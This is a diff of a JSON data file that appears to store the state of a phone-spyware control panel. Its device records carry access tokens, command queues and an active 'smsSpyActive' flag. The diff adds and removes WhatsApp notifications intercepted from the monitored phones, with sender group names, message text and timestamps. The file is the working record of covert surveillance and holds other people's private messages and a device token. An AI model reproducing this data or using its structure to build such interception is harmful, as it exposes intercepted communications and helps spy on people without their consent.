@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042065821,
+    "lastSeen": 1775042068794,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12420 pesan): ~ ⋆ ˚｡⋆୨୧˚ airis ˚୨୧⋆｡˚ ⋆",
+        "content": ".brat apa kau",
+        "time": "01/04 19:14",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042066908
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:01",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041310626
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1888 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041310545
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12420 pesan): ~ ⋆ ˚｡⋆୨୧˚ airis ˚୨୧⋆｡˚ ⋆",
+        "content": ".brat apa kau",
+        "time": "01/04 19:14",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042066921
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14742 pesan dari 11 chat",
+        "time": "01/04 19:14",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042066892
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8048,22 +8064,6 @@
         "time": "01/04 19:01",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041310649
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1888 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041310569
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [6] (96 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041310527
       }
     ],
     "galleryPhotos": [],
